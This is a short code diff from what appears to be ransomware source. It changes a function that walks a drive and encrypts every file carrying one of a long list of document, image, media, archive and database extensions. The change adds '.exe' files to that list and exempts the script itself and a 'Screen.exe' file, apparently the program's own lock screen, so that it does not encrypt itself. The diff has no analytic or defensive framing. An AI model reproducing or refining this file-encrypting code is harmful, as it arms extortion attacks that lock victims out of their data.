@@ -183,10 +183,13 @@ def list_drives():
 
 # Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
 def traverse_encrypt(drive, key):
-    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
+    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv', '.exe')
     
     for root, _, files in os.walk(drive):
         for file in files:
+            if file == "Screen.exe" or file == os.path.basename(__file__):
+                continue
+            
             if any(file.endswith(ext) for ext in extensions):
                 encrypt_file(os.path.join(root, file), key)
 
